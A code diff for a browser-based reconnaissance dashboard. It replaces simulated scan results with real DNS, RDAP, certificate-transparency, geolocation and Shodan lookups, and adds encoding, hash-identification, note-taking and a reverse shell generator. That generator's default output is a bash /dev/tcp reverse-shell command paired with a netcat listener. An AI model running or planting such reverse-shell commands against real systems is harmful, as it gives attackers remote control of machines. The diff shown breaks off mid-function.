@@ -735,6 +735,87 @@
   }
 
   @media (max-width: 600px) { .grid-2 { grid-template-columns: 1fr; } }
+
+  /* New section styles */
+  .tool-textarea {
+    width: 100%; min-height: 100px;
+    background: rgba(0,0,0,0.4);
+    border: 1px solid var(--border);
+    color: var(--neon2); padding: 12px 16px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px; border-radius: 4px;
+    outline: none; resize: vertical;
+    transition: border-color 0.2s;
+  }
+  .tool-textarea:focus { border-color: var(--neon2); box-shadow: var(--glow2); }
+  .tool-textarea::placeholder { color: var(--text-dim); }
+
+  .tool-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+  @media (max-width: 600px) { .tool-grid { grid-template-columns: 1fr; } }
+
+  .tool-btn-row { display: flex; gap: 8px; margin: 10px 0; flex-wrap: wrap; }
+
+  .btn-tool {
+    background: rgba(0,255,159,0.1); border: 1px solid var(--border);
+    color: var(--neon); padding: 6px 14px;
+    cursor: pointer; font-size: 11px;
+    font-family: 'Share Tech Mono', monospace;
+    transition: all 0.2s; border-radius: 3px;
+    text-transform: uppercase; letter-spacing: 1px;
+  }
+  .btn-tool:hover { border-color: var(--neon); background: rgba(0,255,159,0.2); }
+  .btn-tool.active { border-color: var(--neon); background: rgba(0,255,159,0.2); box-shadow: var(--glow); }
+
+  .revshell-output {
+    background: rgba(0,0,0,0.5);
+    border: 1px solid var(--border);
+    border-radius: 4px; padding: 16px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px; color: var(--neon);
+    word-break: break-all; min-height: 50px;
+    position: relative; white-space: pre-wrap;
+  }
+
+  .hash-result {
+    background: rgba(0,0,0,0.3);
+    border: 1px solid var(--border);
+    border-radius: 4px; padding: 12px 16px;
+    margin-top: 12px;
+  }
+
+  .hash-type {
+    display: inline-block;
+    padding: 4px 12px; margin: 4px;
+    border-radius: 3px; font-size: 11px;
+    font-family: 'Share Tech Mono', monospace;
+    font-weight: 700; letter-spacing: 1px;
+    background: rgba(0,212,255,0.12);
+    color: var(--neon2);
+    border: 1px solid rgba(0,212,255,0.25);
+  }
+
+  .notes-meta {
+    font-size: 11px; color: var(--text-dim);
+    font-family: 'Share Tech Mono', monospace;
+    margin-bottom: 8px;
+  }
+
+  .subdomain-table { width: 100%; border-collapse: collapse; }
+  .subdomain-table th {
+    background: rgba(0,255,159,0.08);
+    padding: 8px 12px; text-align: left;
+    font-size: 10px; font-weight: 700;
+    text-transform: uppercase; letter-spacing: 2px;
+    color: var(--neon);
+    border-bottom: 1px solid var(--border);
+  }
+  .subdomain-table td {
+    padding: 8px 12px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px; color: var(--text);
+    border-bottom: 1px solid rgba(255,255,255,0.04);
+  }
+  .subdomain-table tr:hover td { background: rgba(0,255,159,0.03); }
 </style>
 </head>
 <body>
@@ -767,6 +848,17 @@
     <div class="nav-item" onclick="scrollTo_('#checklist-section')"><span class="icon">☑</span> Checklist</div>
     <div class="nav-item" onclick="openTerminal()"><span class="icon">▶</span> Terminal</div>
   </div>
+  <div class="nav-section">
+    <div class="nav-label">Recon Tools</div>
+    <div class="nav-item" onclick="scrollTo_('#subdomain-section')"><span class="icon">⊕</span> Subdomains</div>
+    <div class="nav-item" onclick="scrollTo_('#revshell-section')"><span class="icon">⌘</span> Rev Shell Gen</div>
+  </div>
+  <div class="nav-section">
+    <div class="nav-label">Utilities</div>
+    <div class="nav-item" onclick="scrollTo_('#encoding-section')"><span class="icon">⇌</span> Encode/Decode</div>
+    <div class="nav-item" onclick="scrollTo_('#hash-section')"><span class="icon">#</span> Hash Identifier</div>
+    <div class="nav-item" onclick="scrollTo_('#notes-section')"><span class="icon">✎</span> Op Notes</div>
+  </div>
 </nav>
 
 <!-- Header -->
@@ -776,6 +868,7 @@
   <div class="header-actions">
     <input type="text" id="global-search" placeholder="Search commands..." oninput="handleSearch(this.value)">
     <button class="btn-header" onclick="openTerminal()">▶ Terminal</button>
+    <button class="btn-header" onclick="exportReport()">⬇ Export Report</button>
     <div style="display:flex;gap:6px;align-items:center;">
       <div class="theme-btn active" style="background:linear-gradient(135deg,#00ff9f,#00d4ff)" onclick="setTheme('', this)" title="Matrix Green"></div>
       <div class="theme-btn" style="background:linear-gradient(135deg,#ff00aa,#aa00ff)" onclick="setTheme('cyberpunk', this)" title="Cyberpunk"></div>
@@ -976,6 +1069,131 @@
     </div>
     <div class="progress-bar-wrap"><div class="progress-bar" id="checklist-bar" style="width:0%"></div></div>
     <div id="checklist-items"><!-- Injected by JS --></div>
+  </div>
+</div>
+
+<!-- SUBDOMAIN DISCOVERY -->
+<div class="section" id="subdomain-section">
+  <div class="section-title">⊕ Subdomain Discovery</div>
+  <div class="panel" style="padding:20px">
+    <div class="scan-input-row">
+      <input type="text" class="scan-input" id="subdomain-input" placeholder="Enter domain (e.g. example.com)">
+      <div class="spinner" id="subdomain-spinner"></div>
+      <button class="btn-scan" onclick="runSubdomainScan()">▶ Find Subdomains</button>
+    </div>
+    <div id="subdomain-status" style="font-size:12px;color:var(--text-dim);font-family:'Share Tech Mono',monospace;margin-bottom:12px"></div>
+    <div id="subdomain-results">
+      <table class="subdomain-table">
+        <thead><tr><th>Subdomain</th><th>Issuer</th><th>Not Before</th></tr></thead>
+        <tbody id="subdomain-tbody"><tr><td colspan="3" style="color:var(--text-dim);text-align:center;padding:20px">Enter a domain and click Find Subdomains</td></tr></tbody>
+      </table>
+    </div>
+  </div>
+</div>
+
+<!-- REVERSE SHELL GENERATOR -->
+<div class="section" id="revshell-section">
+  <div class="section-title">⌘ Reverse Shell Generator</div>
+  <div class="panel" style="padding:20px">
+    <div class="builder-grid">
+      <div>
+        <div class="info-label" style="margin-bottom:6px">Language</div>
+        <select class="builder-select" id="revshell-lang" onchange="generateRevShell()">
+          <option value="bash">Bash -i</option>
+          <option value="bash2">Bash TCP</option>
+          <option value="python">Python</option>
+          <option value="python3">Python3</option>
+          <option value="php">PHP</option>
+          <option value="perl">Perl</option>
+          <option value="ruby">Ruby</option>
+          <option value="nc">Netcat (-e)</option>
+          <option value="ncmkfifo">Netcat (mkfifo)</option>
+          <option value="powershell">PowerShell</option>
+          <option value="java">Java</option>
+          <option value="xterm">xterm</option>
+          <option value="socat">Socat</option>
+          <option value="lua">Lua</option>
+        </select>
+      </div>
+      <div>
+        <div class="info-label" style="margin-bottom:6px">Listener IP</div>
+        <input type="text" class="builder-input" id="revshell-ip" placeholder="10.10.14.1" oninput="generateRevShell()" value="10.10.14.1">
+      </div>
+      <div>
+        <div class="info-label" style="margin-bottom:6px">Listener Port</div>
+        <input type="text" class="builder-input" id="revshell-port" placeholder="4444" oninput="generateRevShell()" value="4444">
+      </div>
+      <div>
+        <div class="info-label" style="margin-bottom:6px">Listener Command</div>
+        <div class="revshell-output" id="revshell-listener" style="font-size:12px;min-height:auto;padding:10px 14px">nc -lvnp 4444</div>
+      </div>
+    </div>
+    <div class="info-label" style="margin-bottom:8px">Generated Reverse Shell</div>
+    <div class="revshell-output" id="revshell-output">bash -i >& /dev/tcp/10.10.14.1/4444 0>&1</div>
+    <div style="display:flex;gap:10px;margin-top:12px">
+      <button class="btn-copy" onclick="copyRevShell(this)">Copy Shell</button>
+      <button class="btn-copy" onclick="copyListener(this)">Copy Listener</button>
+    </div>
+  </div>
+</div>
+
+<!-- ENCODING/DECODING -->
+<div class="section" id="encoding-section">
+  <div class="section-title">⇌ Encoding / Decoding Tools</div>
+  <div class="panel" style="padding:20px">
+    <div class="tool-btn-row" id="encoding-type-btns">
+      <button class="btn-tool active" onclick="setEncodingType('base64',this)">Base64</button>
+      <button class="btn-tool" onclick="setEncodingType('url',this)">URL</button>
+      <button class="btn-tool" onclick="setEncodingType('html',this)">HTML</button>
+      <button class="btn-tool" onclick="setEncodingType('hex',this)">Hex</button>
+      <button class="btn-tool" onclick="setEncodingType('rot13',this)">ROT13</button>
+    </div>
+    <div class="tool-grid">
+      <div>
+        <div class="info-label" style="margin-bottom:6px">Input</div>
+        <textarea class="tool-textarea" id="enc-input" placeholder="Enter text to encode/decode..." rows="6"></textarea>
+        <div class="tool-btn-row">
+          <button class="btn-scan" style="padding:8px 20px;font-size:10px" onclick="doEncode()">▶ Encode</button>
+          <button class="btn-scan" style="padding:8px 20px;font-size:10px;background:linear-gradient(135deg, var(--neon2), var(--neon3))" onclick="doDecode()">◀ Decode</button>
+        </div>
+      </div>
+      <div>
+        <div class="info-label" style="margin-bottom:6px">Output</div>
+        <textarea class="tool-textarea" id="enc-output" placeholder="Result will appear here..." rows="6" readonly></textarea>
+        <div class="tool-btn-row">
+          <button class="btn-copy" onclick="copyEncOutput(this)">Copy Output</button>
+          <button class="btn-copy" onclick="swapEncFields()">↕ Swap</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- HASH IDENTIFIER -->
+<div class="section" id="hash-section">
+  <div class="section-title"># Hash Identifier</div>
+  <div class="panel" style="padding:20px">
+    <div class="scan-input-row">
+      <input type="text" class="scan-input" id="hash-input" placeholder="Paste a hash string to identify...">
+      <button class="btn-scan" onclick="identifyHash()">▶ Identify</button>
+    </div>
+    <div id="hash-results">
+      <div style="color:var(--text-dim);padding:12px;text-align:center;font-family:'Share Tech Mono',monospace;font-size:12px">Enter a hash above to identify its type</div>
+    </div>
+  </div>
+</div>
+
+<!-- OPERATION NOTES -->
+<div class="section" id="notes-section">
+  <div class="section-title">✎ Operation Notes</div>
+  <div class="panel" style="padding:20px">
+    <div class="notes-meta" id="notes-meta">No saved notes</div>
+    <textarea class="tool-textarea" id="notes-textarea" placeholder="Record your operation notes, findings, credentials, etc..." rows="10"></textarea>
+    <div style="display:flex;gap:10px;margin-top:12px;flex-wrap:wrap">
+      <button class="btn-scan" style="padding:8px 20px;font-size:10px" onclick="saveNotes()">💾 Save Notes</button>
+      <button class="btn-copy" onclick="exportNotes()">⬇ Export Notes</button>
+      <button class="btn-copy" onclick="clearNotes()">✕ Clear Notes</button>
+    </div>
   </div>
 </div>
 
@@ -1298,8 +1516,10 @@ function switchTab(name) {
 }
 
 // ══════════════════════════════════════════════
-// ANALYSIS ENGINE (Simulated)
+// ANALYSIS ENGINE (Real API calls)
 // ══════════════════════════════════════════════
+let gatheredIntel = {};
+
 function parseTarget(rawTarget) {
   const input = rawTarget.trim();
   if (!input) return null;
@@ -1327,34 +1547,86 @@ async function runAnalysis() {
     return;
   }
   status.textContent = `Running passive analysis for ${parsed.host}...`;
-
   const spinner = document.getElementById('scan-spinner');
   spinner.style.display = 'block';
 
-  setTimeout(async () => {
+  try {
     const intel = await fetchPassiveIntel(parsed);
     spinner.style.display = 'none';
     populateResults(parsed, intel);
-    status.textContent = `Analysis complete for ${parsed.host}.`; 
-  }, 1800);
+    status.textContent = `Analysis complete for ${parsed.host}.`;
+  } catch (err) {
+    spinner.style.display = 'none';
+    status.textContent = `Analysis failed for ${parsed.host}: ${err.message || 'Unknown error'}`;
+  }
 }
 
 async function fetchPassiveIntel(parsed) {
-  const result = { dns: null, rdap: null, headers: null };
-  try {
-    const dnsResp = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(parsed.host)}&type=A`);
-    if (dnsResp.ok) result.dns = await dnsResp.json();
-  } catch {}
+  const result = { dns: {}, rdap: null, headers: null, probe: null, ssl: null, geo: null, pageContent: null };
+
+  // DNS multi-record lookup
+  const dnsTypes = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME'];
+  const dnsPromises = dnsTypes.map(async (type) => {
+    try {
+      const resp = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(parsed.host)}&type=${type}`);
+      if (resp.ok) {
+        const data = await resp.json();
+        result.dns[type] = data.Answer || [];
+      }
+    } catch { result.dns[type] = []; }
+  });
+  await Promise.all(dnsPromises);
+
+  // RDAP
   if (!parsed.isIP) {
     try {
       const rdapResp = await fetch(`https://rdap.org/domain/${encodeURIComponent(parsed.host)}`);
       if (rdapResp.ok) result.rdap = await rdapResp.json();
     } catch {}
   }
+
+  // HTTP probe
   try {
     const probe = await fetch(`https://${parsed.host}`, { method: 'HEAD', mode: 'cors' });
-    if (probe) result.headers = probe.headers;
+    if (probe) {
+      result.headers = Object.fromEntries([...probe.headers.entries()]);
+      result.probe = { status: probe.status, statusText: probe.statusText, ok: probe.ok };
+    }
+  } catch {
+    try {
+      const probe = await fetch(`http://${parsed.host}`, { method: 'HEAD', mode: 'cors' });
+      if (probe) {
+        result.headers = Object.fromEntries([...probe.headers.entries()]);
+        result.probe = { status: probe.status, statusText: probe.statusText, ok: probe.ok };
+      }
+    } catch {}
+  }
+
+  // SSL/TLS via crt.sh
+  try {
+    const sslResp = await fetch(`https://crt.sh/?q=${encodeURIComponent(parsed.host)}&output=json`);
+    if (sslResp.ok) {
+      const sslData = await sslResp.json();
+      result.ssl = sslData.slice(0, 5);
+    }
   } catch {}
+
+  // IP Geolocation
+  const resolvedIP = result.dns['A']?.[0]?.data;
+  if (resolvedIP && /^(\d{1,3}\.){3}\d{1,3}$/.test(resolvedIP)) {
+    try {
+      const geoResp = await fetch(`https://ipapi.co/${resolvedIP}/json/`);
+      if (geoResp.ok) result.geo = await geoResp.json();
+    } catch {}
+  }
+
+  // Try to fetch page content for tech detection
+  try {
+    const pageResp = await fetch(`https://${parsed.host}`, { mode: 'cors' });
+    if (pageResp.ok) result.pageContent = await pageResp.text();
+  } catch {}
+
+  gatheredIntel = { parsed, result, timestamp: new Date().toISOString() };
   return result;
 }
 
@@ -1365,8 +1637,22 @@ function populateResults(parsed, intel = {}) {
   const tld = parts.length > 1 ? '.' + parts.slice(-1)[0] : '';
   const domain = parts.slice(-2).join('.');
   const subdomain = parts.length > 2 ? parts.slice(0, -2).join('.') : 'None';
-  const dnsAnswer = intel?.dns?.Answer?.[0]?.data;
-  const orgName = intel?.rdap?.entities?.find(e => e.roles?.includes('registrant'))?.vcardArray?.[1]?.find(v => v[0] === 'fn')?.[3];
+
+  const aRecords = (intel.dns?.['A'] || []).map(r => r.data).join(', ') || 'N/A';
+  const aaaaRecords = (intel.dns?.['AAAA'] || []).map(r => r.data).join(', ') || 'N/A';
+  const mxRecords = (intel.dns?.['MX'] || []).map(r => r.data).join(', ') || 'N/A';
+  const nsRecords = (intel.dns?.['NS'] || []).map(r => r.data).join(', ') || 'N/A';
+  const txtRecords = (intel.dns?.['TXT'] || []).map(r => r.data).join('; ') || 'N/A';
+  const cnameRecords = (intel.dns?.['CNAME'] || []).map(r => r.data).join(', ') || 'N/A';
+
+  // Geo info
+  const geo = intel.geo;
+  const geoCards = geo ? [
+    { label: 'IP Location', value: `${geo.city || 'N/A'}, ${geo.region || ''} ${geo.country_name || ''}` },
+    { label: 'ISP / Org', value: geo.org || 'N/A' },
+    { label: 'ASN', value: geo.asn || 'N/A' },
+    { label: 'Timezone', value: geo.timezone || 'N/A' },
+  ] : [];
 
   // Domain Info
   document.getElementById('domain-results').innerHTML = makeCards([
@@ -1376,90 +1662,168 @@ function populateResults(parsed, intel = {}) {
     { label: 'Root Domain', value: domain },
     { label: 'Subdomain', value: subdomain },
     { label: 'Protocol', value: parsed.protocol.toUpperCase() || 'HTTPS' },
-    { label: 'A Record', value: dnsAnswer || randomIP() },
-    { label: 'Simulated MX Record', value: 'mail.' + domain + ' (10)' },
-    { label: 'Simulated NS Record', value: 'ns1.' + domain },
+    { label: 'A Records', value: aRecords },
+    { label: 'AAAA Records', value: aaaaRecords },
+    { label: 'MX Records', value: mxRecords },
+    { label: 'NS Records', value: nsRecords },
+    { label: 'CNAME', value: cnameRecords },
+    { label: 'TXT Records', value: txtRecords.length > 200 ? txtRecords.substring(0, 200) + '...' : txtRecords },
+    ...geoCards
   ]);
 
-  // SSL
-  document.getElementById('ssl-results').innerHTML = makeCards([
-    { label: 'HTTPS Detected', value: '<span class="badge badge-green">YES</span>' },
-    { label: 'Port 443', value: '<span class="badge badge-green">OPEN</span>' },
-    { label: 'Certificate Issuer', value: 'Let\'s Encrypt Authority X3' },
-    { label: 'Valid From', value: '2024-01-15' },
-    { label: 'Expires', value: '2025-04-15' },
-    { label: 'TLS Version', value: 'TLSv1.3' },
-    { label: 'Cipher Suite', value: 'TLS_AES_256_GCM_SHA384' },
-    { label: 'HSTS', value: '<span class="badge badge-green">ENABLED</span>' },
-  ]);
+  // SSL/TLS
+  if (intel.ssl && intel.ssl.length > 0) {
+    const cert = intel.ssl[0];
+    const sans = [...new Set(intel.ssl.slice(0,3).map(c => c.common_name))].join(', ');
+    document.getElementById('ssl-results').innerHTML = makeCards([
+      { label: 'HTTPS Probe', value: intel.probe ? '<span class="badge badge-green">Connected</span>' : '<span class="badge badge-yellow">Could not verify</span>' },
+      { label: 'Certificate Issuer', value: cert.issuer_name || 'N/A' },
+      { label: 'Common Name', value: cert.common_name || 'N/A' },
+      { label: 'Not Before', value: cert.not_before || 'N/A' },
+      { label: 'Not After', value: cert.not_after || 'N/A' },
+      { label: 'Serial Number', value: cert.serial_number || 'N/A' },
+      { label: 'SANs (from CT)', value: sans || 'N/A' },
+      { label: 'Source', value: 'Certificate Transparency (crt.sh)' },
+    ]);
+  } else {
+    document.getElementById('ssl-results').innerHTML = makeCards([
+      { label: 'HTTPS Probe', value: intel.probe ? '<span class="badge badge-green">Connected</span>' : '<span class="badge badge-red">Failed</span>' },
+      { label: 'Certificate Data', value: 'Unable to fetch from crt.sh' },
+    ]);
+  }
 
-  // WHOIS
-  const regDate = `${2010 + Math.floor(Math.random()*10)}-${pad(Math.floor(Math.random()*12+1))}-${pad(Math.floor(Math.random()*28+1))}`;
-  document.getElementById('whois-results').innerHTML = makeCards([
-    { label: 'Domain', value: isIP ? 'N/A' : domain },
-    { label: 'Registrar', value: ['GoDaddy', 'Namecheap', 'Cloudflare', 'Network Solutions'][Math.floor(Math.random()*4)] },
-    { label: 'Created', value: regDate },
-    { label: 'Expires', value: '2026-' + regDate.slice(5) },
-    { label: 'Updated', value: '2024-11-01' },
-    { label: 'Country', value: ['US', 'GB', 'DE', 'NL', 'CA'][Math.floor(Math.random()*5)] },
-    { label: 'Organization', value: orgName || domain.split('.')[0].toUpperCase() + ' Inc.' },
-    { label: 'Status', value: '<span class="badge badge-green">clientTransferProhibited</span>' },
-  ]);
+  // WHOIS/RDAP
+  const rdap = intel.rdap;
+  if (rdap) {
+    const registrar = rdap.entities?.find(e => e.roles?.includes('registrar'))?.vcardArray?.[1]?.find(v => v[0] === 'fn')?.[3]
+      || rdap.entities?.find(e => e.roles?.includes('registrar'))?.handle || 'N/A';
+    const registrant = rdap.entities?.find(e => e.roles?.includes('registrant'))?.vcardArray?.[1]?.find(v => v[0] === 'fn')?.[3] || 'N/A';
+    const events = rdap.events || [];
+    const regDate = events.find(e => e.eventAction === 'registration')?.eventDate || 'N/A';
+    const expDate = events.find(e => e.eventAction === 'expiration')?.eventDate || 'N/A';
+    const updDate = events.find(e => e.eventAction === 'last changed')?.eventDate || 'N/A';
+    const status = (rdap.status || []).join(', ') || 'N/A';
+    const ns = rdap.nameservers?.map(n => n.ldhName)?.join(', ') || 'N/A';
 
-  // Security Headers
-  const headers = [
-    { name: 'Content-Security-Policy', present: Math.random() > 0.4 },
-    { name: 'X-Frame-Options', present: Math.random() > 0.3 },
-    { name: 'X-XSS-Protection', present: Math.random() > 0.5 },
-    { name: 'X-Content-Type-Options', present: Math.random() > 0.3 },
-    { name: 'Strict-Transport-Security', present: Math.random() > 0.35 },
-    { name: 'Referrer-Policy', present: Math.random() > 0.5 },
-    { name: 'Permissions-Policy', present: Math.random() > 0.6 },
-    { name: 'Expect-CT', present: Math.random() > 0.7 },
+    document.getElementById('whois-results').innerHTML = makeCards([
+      { label: 'Domain', value: isIP ? 'N/A' : domain },
+      { label: 'Registrar', value: registrar },
+      { label: 'Organization', value: registrant },
+      { label: 'Registered', value: regDate !== 'N/A' ? regDate.split('T')[0] : 'N/A' },
+      { label: 'Expires', value: expDate !== 'N/A' ? expDate.split('T')[0] : 'N/A' },
+      { label: 'Updated', value: updDate !== 'N/A' ? updDate.split('T')[0] : 'N/A' },
+      { label: 'Status', value: status },
+      { label: 'Nameservers', value: ns },
+    ]);
+  } else {
+    document.getElementById('whois-results').innerHTML = makeCards([
+      { label: 'Domain', value: isIP ? 'N/A (IP address)' : domain },
+      { label: 'RDAP Data', value: 'Unable to fetch RDAP data' },
+    ]);
+  }
+
+  // Security Headers - check real headers
+  const realHeaders = intel.headers || {};
+  const secHeaders = [
+    { name: 'Content-Security-Policy', key: 'content-security-policy' },
+    { name: 'X-Frame-Options', key: 'x-frame-options' },
+    { name: 'X-XSS-Protection', key: 'x-xss-protection' },
+    { name: 'X-Content-Type-Options', key: 'x-content-type-options' },
+    { name: 'Strict-Transport-Security', key: 'strict-transport-security' },
+    { name: 'Referrer-Policy', key: 'referrer-policy' },
+    { name: 'Permissions-Policy', key: 'permissions-policy' },
+    { name: 'Cross-Origin-Opener-Policy', key: 'cross-origin-opener-policy' },
   ];
-  document.getElementById('headers-results').innerHTML = headers.map(h => `
-    <div class="header-check">
-      <div class="check-dot ${h.present ? 'present' : 'missing'}"></div>
-      <div style="flex:1;font-family:'Share Tech Mono',monospace;font-size:12px">${h.name}</div>
-      <span class="badge ${h.present ? 'badge-green' : 'badge-red'}">${h.present ? 'PRESENT' : 'MISSING'}</span>
-    </div>
-  `).join('');
+  if (Object.keys(realHeaders).length > 0) {
+    document.getElementById('headers-results').innerHTML = secHeaders.map(h => {
+      const val = realHeaders[h.key];
+      const present = !!val;
+      return `<div class="header-check">
+        <div class="check-dot ${present ? 'present' : 'missing'}"></div>
+        <div style="flex:1;font-family:'Share Tech Mono',monospace;font-size:12px">${h.name}</div>
+        <span class="badge ${present ? 'badge-green' : 'badge-red'}">${present ? 'PRESENT' : 'MISSING'}</span>
+        ${present ? '<div style="font-size:10px;color:var(--text-dim);font-family:Share Tech Mono,monospace;margin-left:8px;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="' + escapeHtml(val).replace(/"/g,'&quot;') + '">' + escapeHtml(val.substring(0,60)) + '</div>' : ''}
+      </div>`;
+    }).join('') + '<div style="padding:8px 14px;font-size:11px;color:var(--text-dim);font-family:Share Tech Mono,monospace">Note: Headers reflect what was accessible via browser CORS fetch. Some headers may be filtered by the browser.</div>';
+  } else {
+    document.getElementById('headers-results').innerHTML = '<div style="color:var(--text-dim);padding:20px;text-align:center;font-family:Share Tech Mono,monospace;font-size:12px">Could not retrieve headers (CORS restriction). Try a public-facing domain.</div>';
+  }
 
-  // HTTP Info
-  const servers = ['nginx/1.24.0', 'Apache/2.4.52', 'Cloudflare', 'Microsoft-IIS/10.0', 'LiteSpeed'];
+  // HTTP Info - real data
+  const probe = intel.probe;
   document.getElementById('http-results').innerHTML = makeCards([
-    { label: 'Status Code', value: '200 OK' },
-    { label: 'Server', value: servers[Math.floor(Math.random()*servers.length)] },
-    { label: 'Content-Type', value: 'text/html; charset=utf-8' },
-    { label: 'Content-Length', value: (Math.floor(Math.random()*80+10)) + ' KB' },
-    { label: 'Cache-Control', value: 'max-age=3600, public' },
-    { label: 'X-Powered-By', value: ['PHP/8.1.2', 'Express', 'None'][Math.floor(Math.random()*3)] },
+    { label: 'Status Code', value: probe ? `${probe.status} ${probe.statusText}` : 'Unable to probe' },
+    { label: 'Server', value: realHeaders['server'] || 'Not disclosed' },
+    { label: 'Content-Type', value: realHeaders['content-type'] || 'N/A' },
+    { label: 'X-Powered-By', value: realHeaders['x-powered-by'] || 'Not disclosed' },
+    { label: 'Cache-Control', value: realHeaders['cache-control'] || 'N/A' },
+    { label: 'CORS (Access-Control)', value: realHeaders['access-control-allow-origin'] || 'Not set' },
+    { label: 'Content-Encoding', value: realHeaders['content-encoding'] || 'N/A' },
+    { label: 'Via / Proxy', value: realHeaders['via'] || 'N/A' },
   ]);
 
-  // Tech Stack
-  const cms = ['WordPress 6.4', 'Drupal 10', 'Joomla 4.3', 'Shopify', 'Custom CMS'];
-  const fw = ['React 18', 'Vue.js 3', 'Angular 15', 'jQuery 3.7', 'Next.js 14'];
-  const cdn = ['Cloudflare', 'Fastly', 'AWS CloudFront', 'Akamai', 'None'];
-  document.getElementById('tech-results').innerHTML = makeCards([
-    { label: 'Detected CMS', value: cms[Math.floor(Math.random()*cms.length)] },
-    { label: 'Framework', value: fw[Math.floor(Math.random()*fw.length)] },
-    { label: 'Analytics', value: 'Google Analytics 4' },
-    { label: 'CDN', value: cdn[Math.floor(Math.random()*cdn.length)] },
-    { label: 'Server OS', value: ['Ubuntu 22.04 LTS', 'CentOS 8', 'Windows Server 2022'][Math.floor(Math.random()*3)] },
-    { label: 'Database', value: ['MySQL 8.0', 'PostgreSQL 15', 'MongoDB 6'][Math.floor(Math.random()*3)] },
-  ]);
+  // Tech Stack - detect from page content
+  const pageContent = intel.pageContent || '';
+  const detections = [];
+  const techChecks = [
+    { name: 'WordPress', patterns: [/wp-content/i, /wp-includes/i, /wordpress/i] },
+    { name: 'React', patterns: [/react\.production/i, /react-dom/i, /__NEXT_DATA__/i, /reactroot/i] },
+    { name: 'Next.js', patterns: [/__NEXT_DATA__/i, /_next\/static/i] },
+    { name: 'Vue.js', patterns: [/vue\.js/i, /vue\.min\.js/i, /vue@/i, /vue-router/i] },
+    { name: 'Nuxt.js', patterns: [/__NUXT__/i, /_nuxt\//i] },
+    { name: 'Angular', patterns: [/ng-version/i, /angular\.js/i, /angular\.min\.js/i] },
+    { name: 'jQuery', patterns: [/jquery/i, /jquery\.min\.js/i] },
+    { name: 'Bootstrap', patterns: [/bootstrap\.min\.(css|js)/i, /bootstrap@/i] },
+    { name: 'Tailwind CSS', patterns: [/tailwindcss/i, /tailwind\.min/i] },
+    { name: 'Google Analytics', patterns: [/google-analytics\.com/i, /gtag\/js/i, /googletagmanager/i] },
+    { name: 'Cloudflare', patterns: [/cloudflare/i, /cf-ray/i] },
+    { name: 'Shopify', patterns: [/shopify/i, /cdn\.shopify/i] },
+    { name: 'Drupal', patterns: [/drupal/i, /sites\/default\/files/i] },
+    { name: 'Joomla', patterns: [/joomla/i, /\/media\/system\/js/i] },
+    { name: 'Wix', patterns: [/wix\.com/i, /wixstatic/i] },
+    { name: 'Squarespace', patterns: [/squarespace/i] },
+    { name: 'PHP', patterns: [/\.php/i] },
+    { name: 'ASP.NET', patterns: [/__VIEWSTATE/i, /asp\.net/i] },
+  ];
+
+  const metaGen = pageContent.match(/<meta[^>]+name=["']generator["'][^>]+content=["']([^"']+)["']/i);
+  if (metaGen) detections.push({ name: 'Generator', value: metaGen[1] });
+
+  techChecks.forEach(tc => {
+    if (tc.patterns.some(p => p.test(pageContent))) {
+      detections.push({ name: tc.name, value: 'Detected' });
+    }
+  });
+
+  // Also check server header for CDN clues
+  const serverHeader = realHeaders['server'] || '';
+  if (/cloudflare/i.test(serverHeader)) detections.push({ name: 'Cloudflare CDN', value: 'via Server header' });
+  if (/nginx/i.test(serverHeader)) detections.push({ name: 'Nginx', value: serverHeader });
+  if (/apache/i.test(serverHeader)) detections.push({ name: 'Apache', value: serverHeader });
+  if (/microsoft-iis/i.test(serverHeader)) detections.push({ name: 'IIS', value: serverHeader });
+  if (/litespeed/i.test(serverHeader)) detections.push({ name: 'LiteSpeed', value: serverHeader });
+
+  if (detections.length > 0) {
+    const unique = [...new Map(detections.map(d => [d.name, d])).values()];
+    document.getElementById('tech-results').innerHTML = makeCards(
+      unique.map(d => ({ label: d.name, value: d.value }))
+    ) + '<div style="padding:8px;font-size:11px;color:var(--text-dim);font-family:Share Tech Mono,monospace">Detection based on page content analysis and HTTP headers. Some technologies may not be detectable via browser.</div>';
+  } else {
+    document.getElementById('tech-results').innerHTML = makeCards([
+      { label: 'Detection', value: pageContent ? 'No common technologies detected in page source' : 'Unable to fetch page content (CORS)' },
+      { label: 'Server', value: serverHeader || 'Not disclosed' },
+    ]);
+  }
 }
 
 function makeCards(arr) {
   return arr.map(c => `<div class="info-card"><div class="info-label">${c.label}</div><div class="info-value">${c.value}</div></div>`).join('');
 }
 
-function randomIP() { return `${r255()}.${r255()}.${r255()}.${r255()}`; }
-function r255() { return Math.floor(Math.random()*255); }
 function pad(n) { return String(n).padStart(2,'0'); }
 
 // ══════════════════════════════════════════════
-// PORT SCANNER (Simulated)
+// PORT SCANNER (Shodan InternetDB)
 // ══════════════════════════════════════════════
 const COMMON_PORTS = [
   {port:21,svc:'FTP'},{port:22,svc:'SSH'},{port:23,svc:'Telnet'},
@@ -1471,34 +1835,417 @@ const COMMON_PORTS = [
   {port:8080,svc:'HTTP-Proxy'},{port:8443,svc:'HTTPS-Alt'},{port:27017,svc:'MongoDB'}
 ];
 
-function runPortScan() {
+function getServiceName(port) {
+  const known = COMMON_PORTS.find(p => p.port === port);
+  return known ? known.svc : 'unknown';
+}
+
+async function runPortScan() {
   const target = parseTarget(document.getElementById('target-input').value.trim() || 'target.com');
   if (!target) {
     document.getElementById('analysis-status').textContent = 'Please provide a valid target before running a port scan.';
     return;
   }
-  const [startPort, endPort] = document.getElementById('port-range').value.split('-').map(n => parseInt(n.trim(), 10));
-  if (!Number.isInteger(startPort) || !Number.isInteger(endPort) || startPort < 1 || endPort > 65535 || startPort > endPort) {
-    document.getElementById('analysis-status').textContent = 'Invalid port range. Use format like 1-1000.';
+  const tbody = document.getElementById('port-tbody');
+  tbody.innerHTML = `<tr><td colspan="4" style="text-align:center;color:var(--neon);font-family:'Share Tech Mono',monospace;font-size:12px;padding:20px">Querying Shodan InternetDB for ${target.host}...</td></tr>`;
+
+  let ip = target.host;
+  if (!target.isIP) {
+    try {
+      const dnsResp = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(target.host)}&type=A`);
+      if (dnsResp.ok) {
